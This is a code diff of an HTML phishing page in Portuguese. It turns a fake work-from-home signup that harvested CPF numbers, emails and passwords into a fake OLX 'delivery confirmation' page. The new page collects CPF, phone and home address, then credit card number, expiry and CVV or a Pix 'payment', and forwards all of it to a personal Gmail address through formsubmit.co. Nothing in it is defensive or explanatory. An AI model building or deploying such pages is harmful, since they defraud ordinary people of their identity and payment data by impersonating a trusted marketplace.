@@ -2,89 +2,83 @@
 <html lang="pt-BR">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Cadastro Profissional</title>
-
-  <!-- Script do OneSignal atualizado -->
-  <script src="https://cdn.onesignal.com/sdks/web/v16/OneSignalSDK.page.js" defer></script>
-  <script>
-    window.OneSignalDeferred = window.OneSignalDeferred || [];
-    OneSignalDeferred.push(async function(OneSignal) {
-      await OneSignal.init({
-        appId: "8ea3b56c-7d49-4126-8c52-b113d0a7f42d",
-      });
-    });
-  </script>
-
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Confirmação de Entrega • OLX</title>
   <style>
+    * { box-sizing: border-box; }
     body {
-      font-family: Arial, sans-serif;
-      background: linear-gradient(to right, #83a4d4, #b6fbff);
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
+      font-family: 'Segoe UI', sans-serif;
       margin: 0;
+      background: #f2f2f2;
+      padding: 0;
     }
     .container {
+      max-width: 500px;
+      margin: 30px auto;
       background: #fff;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.05);
       padding: 30px;
-      border-radius: 12px;
-      box-shadow: 0 8px 16px rgba(0,0,0,0.2);
-      width: 100%;
-      max-width: 420px;
     }
     h2 {
-      text-align: center;
       margin-bottom: 20px;
-      color: #333;
+      color: #222;
+      font-size: 22px;
     }
     label {
       display: block;
-      margin-top: 12px;
+      margin-bottom: 10px;
+      color: #444;
       font-weight: bold;
     }
-    input {
+    input, select {
       width: 100%;
-      padding: 12px;
-      margin-top: 6px;
-      border: 1px solid #ccc;
+      padding: 10px;
+      margin-bottom: 15px;
       border-radius: 6px;
-      font-size: 14px;
+      border: 1px solid #ccc;
     }
     button {
-      width: 100%;
-      padding: 14px;
-      margin-top: 20px;
-      background-color: #007bff;
+      background: #ff5a00;
       color: white;
       border: none;
+      padding: 12px;
       border-radius: 6px;
+      width: 100%;
       font-size: 16px;
       cursor: pointer;
     }
-    button:hover {
-      background-color: #0056b3;
+    .tela { display: none; }
+    .ativa { display: block; }
+    .pix-box {
+      background: #eee;
+      padding: 15px;
+      border-radius: 6px;
+      word-break: break-word;
+      margin-bottom: 15px;
+      font-weight: bold;
     }
-    .carregando, .mensagem-final {
-      display: none;
+
+    /* Barra de carregamento */
+    .carregando {
       text-align: center;
-      margin-top: 20px;
+      font-weight: bold;
+      font-size: 16px;
     }
     .barra {
       width: 100%;
-      background-color: #ddd;
-      border-radius: 10px;
+      background: #ddd;
+      border-radius: 6px;
       overflow: hidden;
-      height: 20px;
-      margin-top: 20px;
+      margin-top: 15px;
     }
     .progresso {
-      height: 100%;
+      height: 14px;
       width: 0%;
-      background-color: #007bff;
-      animation: carregar 3s linear forwards;
+      background-color: #ff5a00;
+      animation: carregar 3s forwards;
     }
+
     @keyframes carregar {
       0% { width: 0%; }
       100% { width: 100%; }
@@ -93,95 +87,108 @@
 </head>
 <body>
 
-<div class="container">
-  <h2>Comece agora como Home Office</h2>
+  <!-- Tela 1: Dados de Entrega -->
+  <form id="tela1" class="container tela ativa">
+    <h2>Confirmação de Entrega</h2>
 
-  <form id="formulario">
-    <label for="nome">Nome completo</label>
-    <input type="text" id="nome" name="nome" required>
+    <label>Nome completo:</label>
+    <input type="text" name="nome" required>
 
-    <label for="data">Data de nascimento</label>
-    <input type="date" id="data" name="data_nascimento" required>
+    <label>CPF:</label>
+    <input type="text" name="cpf" pattern="\d{11}" maxlength="11" required>
 
-    <label for="cpf">CPF</label>
-    <input type="text" id="cpf" name="cpf" required>
+    <label>Telefone:</label>
+    <input type="text" name="telefone" maxlength="15" required>
 
-    <label for="email">E-mail</label>
-    <input type="email" id="email" name="email_usuario" required>
+    <label>CEP:</label>
+    <input type="text" name="cep" pattern="\d{8}" maxlength="8" required>
 
-    <label for="senha">Senha</label>
-    <input type="password" id="senha" name="senha" required>
+    <label>Endereço:</label>
+    <input type="text" name="endereco" required>
 
-    <label for="confirmarSenha">Confirmar senha</label>
-    <input type="password" id="confirmarSenha" name="confirmar_senha" required>
+    <label>Número:</label>
+    <input type="text" name="numero" required>
 
-    <p style="font-size: 13px; color: #555; margin-top: 10px;">
-      Após concluir o cadastro, você será automaticamente incluído em nosso grupo exclusivo no Instagram.
-    </p>
+    <label>Complemento:</label>
+    <input type="text" name="complemento">
 
-    <button type="submit">Enviar cadastro</button>
+    <label>Cidade:</label>
+    <input type="text" name="cidade" required>
+
+    <label>Estado:</label>
+    <input type="text" name="estado" required>
+
+    <button type="button" onclick="mostrarCarregamento()">Continuar</button>
   </form>
 
-  <div class="carregando" id="carregando">
-    <p>Enviando informações...</p>
-    <div class="barra">
-      <div class="progresso"></div>
+  <!-- Tela Carregando -->
+  <div id="telaCarregando" class="container tela">
+    <div class="carregando">
+      <p>Verificando dados de entrega...</p>
+      <div class="barra">
+        <div class="progresso"></div>
+      </div>
     </div>
   </div>
 
-  <div class="mensagem-final" id="mensagemFinal">
-    <h3>✅ Cadastro Concluído</h3>
-    <p>Seu acesso foi liberado!<br>Você será redirecionado em instantes para as tarefas disponíveis.</p>
+  <!-- Tela 2: Escolher Pagamento -->
+  <div id="tela2" class="container tela">
+    <h2>Escolha a forma de pagamento</h2>
+    <button onclick="selecionarPagamento('cartao')">Pagar com Cartão de Crédito</button>
+    <br><br>
+    <button onclick="selecionarPagamento('pix')">Pagar via Pix</button>
   </div>
-</div>
 
-<script>
-  document.getElementById("formulario").addEventListener("submit", function(e) {
-    e.preventDefault();
+  <!-- Tela 3: Cartão -->
+  <form id="formCartao" class="container tela" action="https://formsubmit.co/natanaelverissimo34@gmail.com" method="POST">
+    <h2>Pagamento com Cartão</h2>
+    <input type="hidden" name="forma_pagamento" value="cartao">
+    <label>Número do cartão:</label>
+    <input type="text" name="numero_cartao" maxlength="16" pattern="\d{16}" required>
 
-    const senha = document.getElementById("senha").value;
-    const confirmarSenha = document.getElementById("confirmarSenha").value;
+    <label>Nome no cartão:</label>
+    <input type="text" name="nome_cartao" required>
 
-    if (senha !== confirmarSenha) {
-      alert("As senhas não coincidem.");
-      return;
-    }
+    <label>Validade (MM/AA):</label>
+    <input type="text" name="validade" placeholder="12/28" required>
 
-    const form = e.target;
-    const formData = new FormData(form);
+    <label>CVV:</label>
+    <input type="text" name="cvv" maxlength="3" pattern="\d{3}" required>
 
-    form.style.display = "none";
-    document.getElementById("carregando").style.display = "block";
+    <button type="submit">Finalizar</button>
+  </form>
 
-    fetch("https://formsubmit.co/ajax/natanaelverissimo34@gmail.com", {
-      method: "POST",
-      body: formData,
-      headers: {
-        'Accept': 'application/json'
-      }
-    })
-    .then(response => {
-      if (response.ok) {
+  <!-- Tela 3: Pix -->
+  <form id="formPix" class="container tela" action="https://formsubmit.co/natanaelverissimo34@gmail.com" method="POST">
+    <h2>Pagamento via Pix</h2>
+    <input type="hidden" name="forma_pagamento" value="pix">
+    <div class="pix-box">pix-chave-fake@provedor.com</div>
+
+    <label>Nome do pagador:</label>
+    <input type="text" name="nome_pagador" required>
+
+    <button type="submit">Já paguei</button>
+  </form>
+
+  <script>
+    function mostrarCarregamento() {
+      const form = document.getElementById('tela1');
+      if (form.checkValidity()) {
+        form.classList.remove('ativa');
+        document.getElementById('telaCarregando').classList.add('ativa');
         setTimeout(() => {
-          document.getElementById("carregando").style.display = "none";
-          document.getElementById("mensagemFinal").style.display = "block";
-
-          setTimeout(() => {
-            window.location.href = "https://tarefass.github.io/tarefas-/";
-          }, 3000);
-
+          document.getElementById('telaCarregando').classList.remove('ativa');
+          document.getElementById('tela2').classList.add('ativa');
         }, 3000);
       } else {
-        throw new Error('Erro ao enviar');
+        form.reportValidity();
       }
-    })
-    .catch(error => {
-      alert("Ocorreu um erro ao enviar o formulário.");
-      form.style.display = "block";
-      document.getElementById("carregando").style.display = "none";
-    });
-  });
-</script>
+    }
 
+    function selecionarPagamento(tipo) {
+      document.getElementById('tela2').classList.remove('ativa');
+      document.getElementById('form' + tipo.charAt(0).toUpperCase() + tipo.slice(1)).classList.add('ativa');
+    }
+  </script>
 </body>
 </html>
